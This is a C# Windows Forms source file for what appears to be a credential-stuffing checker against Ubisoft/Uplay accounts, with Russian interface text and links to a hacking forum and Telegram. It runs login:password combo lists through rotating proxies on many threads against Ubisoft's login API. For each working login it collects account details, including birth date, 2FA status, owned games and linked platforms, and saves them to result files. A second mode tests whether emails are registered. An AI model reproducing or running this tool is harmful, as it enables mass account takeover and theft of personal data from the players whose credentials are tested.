using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using xNet;

namespace WahtProject
{
    public partial class Form1 : Form
    {
        private readonly string ErrPath = Application.StartupPath.ToString() + @"\ErrorLog.txt";
        private static readonly AutoResetEvent autoResetEvent = new AutoResetEvent(false);
        private readonly AutoResetEvent reset = autoResetEvent;
        public string path = "Result\\";
        public static string huita = "";
        public static object _syncSave = new object();

        public Form1()
        {
            InitializeComponent();
            Control.CheckForIllegalCrossThreadCalls = false;
            try
            {
                RegistryKey op = Registry.CurrentUser.OpenSubKey(Loader.soft);
                txtUrl.Text = (string)op.GetValue("proxy");
                op.Close();
            }
            catch
            { }
        }

        private void btUploadFile_Click(object sender, EventArgs e)
        {
            try
            {
                Loader.Source();
                this.allaccountL.Text = Loader.sourceList.Count.ToString();
                this.progressBar1.Maximum = Loader.sourceList.Count;
            }
            catch
            {
            }
        }

        private void btUploadProxy_Click(object sender, EventArgs e)
        {
            try
            {
                Loader.Proxy();
                this.proxiesL.Text = Loader.proxyList.Count.ToString();
            }
            catch
            {
            }
        }

        private void label16_Click(object sender, EventArgs e)
        {
            Process.Start("https://lolz.guru/leniawar/");
        }

        private void label14_Click(object sender, EventArgs e)
        {
            Process.Start("https://tlgg.ru/leniawar");
        }

        private void TimerUpdateProxy_Tick(object sender, EventArgs e)
        {
            try
            {
                Loader.Update_Proxy(txtUrl.Text);
                this.proxiesL.Text = Loader.proxyList.Count.ToString();
            }
            catch
            { }
        }

        private void Restart_Click(object sender, EventArgs e)
        {
            Loader.count = 1;
            Application.Restart();
            BruteIcon.Dispose();
            Environment.Exit(0);
        }

        private void Rabota()
        {
            while (Loader.rabota)
            {
                try
                {
                    string acc = string.Empty;
                    string login = string.Empty;
                    string pass = string.Empty;
                    string proxy = Loader.GetProxy();
                    string host = string.Empty;
                    string port = string.Empty;

                    lock (this)
                    {
                        if (Loader.sourceList.Count > 0)
                        {
                            acc = Loader.sourceList[0];
                            Loader.sourceList.RemoveAt(0);
                        }
                        if (progressBar1.Value == progressBar1.Maximum)
                        {
                            btStop_Click(null, null);
                            return;
                        }
                    }
                    if (string.IsNullOrEmpty(acc))
                    {
                        Thread.Sleep(1200);
                        continue;
                    }
                    if (acc.Contains(";"))
                    {
                        acc = acc.Replace(";", ":");
                    }
                    if (acc.Contains(":"))
                    {
                        login = acc.Split(':')[0].Trim();
                        pass = acc.Split(':')[1].Trim();
                    }
                    if (login.Contains("") || pass.Contains(""))
                    {
                        Loader.sourceList.Remove(acc);
                    }
                    if (proxy.Contains(":"))
                    {
                        host = proxy.Split(':')[0].Trim();
                        port = proxy.Split(':')[1].Trim();
                    }

                    Check(login, pass, host, port);
                }
                catch { continue; }
            }
        }

        private void Check(string login, string pass, string host , string port)
        {
            try
            {
                if (comboBox1.SelectedIndex == 0)
                {
                    try
                    {
                        string text = string.Empty;
                        string proxyAddress = host + ":" + port;
                        HttpRequest httpRequest = new HttpRequest
                        {
                            Cookies = new CookieDictionary(),
                            UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 YaBrowser/20.2.0.1043 Yowser/2.5 Safari/537.36"
                        };

                        if (this.typeProxy.SelectedIndex == 0)
                            httpRequest.Proxy = (ProxyClient)HttpProxyClient.Parse(proxyAddress);
                        else if (this.typeProxy.SelectedIndex == 1)
                            httpRequest.Proxy = (ProxyClient)Socks4ProxyClient.Parse(proxyAddress);
                        else if (this.typeProxy.SelectedIndex == 2)
                            httpRequest.Proxy = (ProxyClient)Socks5ProxyClient.Parse(proxyAddress);


                        httpRequest.ConnectTimeout = 15000;
                        string resp = ""; //Return answer
                        string str = Convert.ToBase64String(Encoding.UTF8.GetBytes(login + ":" + pass));
                        httpRequest.AddHeader("Authorization", "Basic " + str);
                        httpRequest.AddHeader("Ubi-AppId", "e06033f4-28a4-43fb-8313-6c2d882bc4a6");
                        var Singin = httpRequest.Post("https://public-ubiservices.ubi.com/v3/profiles/sessions", string.Concat("{\"rememberMe\":true}"), "application/json").ToString();
                        if (!Singin.Contains("ticket"))
                        {
                            resp = (Singin.Contains("ip address") ? "Bad" : ((!Singin.Contains("\"message\":\"Invalid credentials\"")) ? "Bad" : "Error"));
                            this.DataResultbaderror(resp, login + ":" + pass);
                        }
                        else
                        {
                            int num = 0;
                            Match match = Regex.Match(Singin, "(?<=\"userId\":\")(.*?)(?=\")");
                            Match match2 = Regex.Match(Singin, "(?<=\"ticket\":\")(.*?)(?=\")");
                            Regex.Match(Singin, "(?<=\"sessionId\":\")(.*?)(?=\")");
                            Match match3 = Regex.Match(Singin, "(?<=\"nameOnPlatform\":\")(.*?)(?=\")");
                            httpRequest.AddHeader("Authorization", "Ubi_v1 t=" + match2.ToString());
                            httpRequest.AddHeader("ubi-appid", "314d4fef-e568-454a-ae06-43e3bece12a6");
                            Match match4 = Regex.Match(httpRequest.Get("https://public-ubiservices.ubi.com/v3/profiles/me/2fa").ToString(), "(?<=\"active\":)(.*?)(?=,)");
                            httpRequest.AddHeader("Authorization", "Ubi_v1 t=" + match2.ToString());
                            httpRequest.AddHeader("ubi-appid", "314d4fef-e568-454a-ae06-43e3bece12a6");
                            Match match5 = Regex.Match(httpRequest.Get("https://public-ubiservices.ubi.com/v1/profiles/me/club/aggregation/website/stats/lastplayedgame").ToString(), "(?<=lastSessionDate\":\")(.*?)(?=T)");
                            httpRequest.AddHeader("Authorization", "Ubi_v1 t=" + match2.ToString());
                            httpRequest.AddHeader("Ubi-AppId", "c5393f10-7ac7-4b4f-90fa-21f8f3451a04");
                            httpRequest.AddHeader("Ubi-RequestedPlatformType", "uplay");
                            string input = httpRequest.Get("https://public-ubiservices.ubi.com/v1/profiles/me/club/aggregation/website/games/owned?").ToString();
                            httpRequest.AddHeader("Authorization", "Ubi_v1 t=" + match2.ToString());
                            httpRequest.AddHeader("Ubi-AppId", "c5393f10-7ac7-4b4f-90fa-21f8f3451a04");
                            httpRequest.AddHeader("Ubi-RequestedPlatformType", "uplay");
                            string input2 = httpRequest.Get("https://public-ubiservices.ubi.com/v3/users/" + match).ToString();
                            Match match6 = Regex.Match(input2, "(?<=\"country\":\")(.*?)(?=\")");
                            Match match7 = Regex.Match(input2, "(?<=\"dateCreated\":\")(.*?)(?=T)");
                            Match match8 = Regex.Match(input2, "(?<=\"dateOfBirth\":\")(.*?)(?=T)");
                            Match match9 = Regex.Match(input2, "(?<=locked\":)(.*?)(?=})");
                            httpRequest.AddHeader("Authorization", "Ubi_v1 t=" + match2.ToString());
                            httpRequest.AddHeader("Ubi-AppId", "c5393f10-7ac7-4b4f-90fa-21f8f3451a04");
                            httpRequest.AddHeader("Ubi-RequestedPlatformType", "uplay");
                            new List<string>();
                            string input3 = httpRequest.Get(string.Concat("https://public-ubiservices.ubi.com/v3/users/", match, "/profiles")).ToString();
                            List<string> list = new List<string>();
                            List<string> list2 = new List<string>();
                            string pattern = "(?<=\"title\":\")(.*?)(?=\")";
                            string pattern2 = "(?<=\"platform\":\")(.*?)(?=\")";
                            string pattern3 = "(?<=\"platformType\":\")(.*?)(?=\")";
                            text = string.Concat(text, "goodline|", login, ":", pass, "\r\nUserID: ", match, "\r\nNameOnUplay: ", match3, "\r\nCountry: ", match6, "\r\nDateCreate: ", match7, "\r\nDateBirth: ", match8, "\r\n2FA - ", match4, "\r\nLock: ", match9, "\r\nLast Activ: ", match5, "\r\nПривязанные Платформы: \r\n");
                            foreach (Match item in Regex.Matches(input3, pattern3))
                            {
                                text = string.Concat(text, "- ", item, "\r\n");
                            }
                            foreach (Match item2 in Regex.Matches(input, pattern))
                            {
                                if (!(item2.ToString() == "Shooter") && !(item2.ToString() == "Strategy") && !(item2.ToString() == "Action") && !(item2.ToString() == "Adventure") && !(item2.ToString() == "Hunter") && !(item2.ToString() == "RPG") && !(item2.ToString() == "Sports") && !(item2.ToString() == "Games for everyone") && !(item2.ToString() == "Featured Games") && !(item2.ToString() == "Assassins's Creed archives") && !(item2.ToString() == "Simulation"))
                                {
                                    list.Add(item2.ToString());
                                    num++;
                                }
                            }
                            foreach (Match item3 in Regex.Matches(input, pattern2))
                            {
                                list2.Add(item3.ToString());
                            }
                            List<string> list3 = new List<string>();
                            text += "Игры на аккаунте: \r\n";
                            for (int i = 0; i < list.Count; i++)
                            {
                                list3.Add(list[i] + " " + list2[i]);
                            }
                            foreach (string item4 in list3)
                            {
                                SaveLine(Helper.path2 + $"\\{item4}.txt", string.Concat(login, ":", pass, "\r\nNameOnUplay: ", match3, "\r\n2FA", match4, "\r\nLast Activ: ", match5, "\r\n**************************\r\n"));
                                text = text + "- " + item4 + "\r\n";
                            }
                            DataResultGood(text);
                        }
                    }
                    catch
                    {
                        
                    }
                }
                if (comboBox1.SelectedIndex == 1)
                {
                    try
                    {
                        string proxyAddress = host + ":" + port;
                        HttpRequest req = new HttpRequest
                        {
                            Cookies = new CookieDictionary(),
                            UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 YaBrowser/20.2.0.1043 Yowser/2.5 Safari/537.36"
                        };

                        if (this.typeProxy.SelectedIndex == 0)
                            req.Proxy = (ProxyClient)HttpProxyClient.Parse(proxyAddress);
                        else if (this.typeProxy.SelectedIndex == 1)
                            req.Proxy = (ProxyClient)Socks4ProxyClient.Parse(proxyAddress);
                        else if (this.typeProxy.SelectedIndex == 2)
                            req.Proxy = (ProxyClient)Socks5ProxyClient.Parse(proxyAddress);

                        string resp = ""; //Return answer
                        req.AddHeader("GenomeId", "031c6c79-623d-4831-9c01-0f01d1f77c88");
                        req.AddHeader("Ubi-RequestedPlatformType", "uplay");
                        req.AddHeader("Ubi-AppId", "e06033f4-28a4-43fb-8313-6c2d882bc4a6");
                        string text5 = req.Post("https://public-ubiservices.ubi.com/v3/users/validatecreation", "{\"email\":\"" + login + "\",\"confirmedEmail\":\"" + login + "\"}", "application/json").ToString();
                        if (text5.Contains("Email address already registered"))
                        {
                            resp = "Good";
                            this.DataResultbaderror(resp, login + ":" + pass);
                        }
                        if (text5.Contains("is banned from"))
                        {
                            resp = "Bad";
                            this.DataResultbaderror(resp, login + ":" + pass);
                        }
                        if (text5.Contains("{\"errorCode\":3333"))
                        {
                            resp = "Bad";
                            this.DataResultbaderror(resp, login + ":" + pass);
                        }
                    }
                    catch 
                    {
                        this.DataResultbaderror("Error", login + ":" + pass);
                    }
                }
            }
            catch
            {
                this.DataResultbaderror("Error", login + ":" + pass);
            }
        }

        public void SaveLine(string path, string line)
        {
            lock (_syncSave)
            {
                using (StreamWriter streamWriter = new StreamWriter(path, append: true))
                {
                    streamWriter.WriteLine(line);
                }
            }
        }


        public void DataResultbaderror (string result, string acc)
        {
            if (result == "Bad")
            {
                if (SaveBad.Checked)
                {
                    ++Loader.bad;
                    File.AppendAllText(Helper.path1 + "\\Bad.txt", acc + "\n");
                    this.progressBar1.PerformStep();
                    Invoke((MethodInvoker)delegate { allaccountL.Text = Convert.ToString(Convert.ToInt32(allaccountL.Text) - 1); });
                }
                else
                {
                    ++Loader.bad;
                    Invoke((MethodInvoker)delegate { allaccountL.Text = Convert.ToString(Convert.ToInt32(allaccountL.Text) - 1); });
                    this.progressBar1.PerformStep();
                }
            }
            if (result == "Error")
            {
                ++Loader.error;
                Loader.sourceList.Add(acc);
            }
            if (result == "Good")
            {
                ++Loader.good;
                this.allaccountL.Text = Convert.ToString(Convert.ToInt32(this.allaccountL.Text) - 1);
                this.progressBar1.PerformStep();
                File.AppendAllText(Helper.path1 + "\\Good(без лога).txt", acc + "\n");
                Invoke((MethodInvoker)delegate { allaccountL.Text = Convert.ToString(Convert.ToInt32(allaccountL.Text) - 1); });
            }
            this.Invoke((Action)(() => {
                this.badproxiesL.Text = Loader.error.ToString();
                this.goodL.Text = Loader.good.ToString();
                this.badL.Text = Loader.bad.ToString();
            }));
        }

        public void DataResultGood(string result)
        {
           lock (this)
           {
                if (result.Contains("goodline|"))
                {
                    ++Loader.good;
                    this.allaccountL.Text = Convert.ToString(Convert.ToInt32(this.allaccountL.Text) - 1);
                    string[] array = result.Split('|');
                    array[1].ToString().Split(':');
                    SaveLine(Helper.path1 + "/GoodsLog.txt", array[1]);
                    this.progressBar1.PerformStep();
                    Invoke((MethodInvoker)delegate { allaccountL.Text = Convert.ToString(Convert.ToInt32(allaccountL.Text) - 1); });
                }
                this.Invoke((Action)(() => {
                    this.goodL.Text = Loader.good.ToString();
                }));
            }
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Process.GetCurrentProcess().Kill();
        }

        private void label3_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
            if (this.WindowState == FormWindowState.Minimized)
                this.Hide();
            this.BruteIcon.ShowBalloonTip(3000);
        }

        private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            this.Show();
            this.WindowState = FormWindowState.Normal;
        }


        private void btnremains_Click(object sender, EventArgs e)
        {
            if (Loader.sourceList.Count != 0)
            {
                btnremains.Enabled = false;
                File.AppendAllLines(Helper.path1 + "\\ostatoc.txt", Loader.sourceList);
                MessageBox.Show("Остаток сохранен!", "Информация");
            }
            else
            {
                btnremains.Enabled = true;
                MessageBox.Show("Нам нечего сохранять!", "Ошибка");
            }
        }

        private void Proxylink_CheckedChanged(object sender, EventArgs e)
        {
            if (this.cbUseProxyLink.Checked)
                this.btUploadProxy.Enabled = false;
            else
                this.btUploadProxy.Enabled = true;
        }

        private void btStart_Click(object sender, EventArgs e)
        {
            Directory.CreateDirectory(path);
            Directory.CreateDirectory(Helper.path1);
            Directory.CreateDirectory(Helper.path2);


            Loader.good = 0; Loader.bad = 0; Loader.error = 0; Loader.captcha = 0;
            btStart.Enabled = false;
            btStop.Enabled = true;
            Restart.Enabled = true;
            goodL.Text = "0";
            badproxiesL.Text = "0";
            badL.Text = "0";

            if (allaccountL.Text == "0")
            {
                btStart.Enabled = true;
                btStop.Enabled = false;
                MessageBox.Show("Загрузите базу!", "Ошибка");
                return;
            }

            if (cbUseProxyLink.Checked)
            {
                groupBox2.Enabled = false;
                if (txtUrl.Text == "")
                {
                    MessageBox.Show("Укажите ссылку на прокси!", "Ошибка");
                    return;
                }

                if (cbUpdateTime.Checked)
                {
                    TimerUpdateProxy.Interval = (int)numTimeUpdate.Value * 60000;
                    TimerUpdateProxy.Start();
                }

                Loader.Update_Proxy(txtUrl.Text);
                proxiesL.Text = Loader.proxyList.Count.ToString();
                huita = txtUrl.Text;
                RegistryKey key = Registry.CurrentUser.CreateSubKey(Loader.soft);
                key.SetValue("proxy", huita);
                key.Close();
            }
            if (Loader.proxyList.Count == 0)
            {
                btStart.Enabled = true;
                btStop.Enabled = false;
                MessageBox.Show("Загрузите прокси!", "Ошибка");
                return;
            }
            else
            {
                Loader.rabota = true;
                Loader.threadList.Clear();
                for (int thrcount = 0; thrcount < numThread.Value; thrcount++)
                {
                    Thread th = new Thread(Rabota);
                    Loader.threadList.Add(th);
                    th.Start();
                }
            }
        }

        private void btStop_Click(object sender, EventArgs e)
        {
            btStop.Enabled = false;
            btStart.Enabled = true;
            Restart.Enabled = true;
            TimerUpdateProxy.Stop();
            TimerUpdateProxy.Dispose();
            Loader.rabota = false;
            Loader.threadList.Clear();
            foreach (Thread thread in Loader.threadList)
            {
                thread.Abort();
            }
            MessageBox.Show("Работа Завершена!", "Информация");
        }

        private void ResultFolderOpen_Click(object sender, EventArgs e)
        {
            Process.Start(path);
        }
    }
}
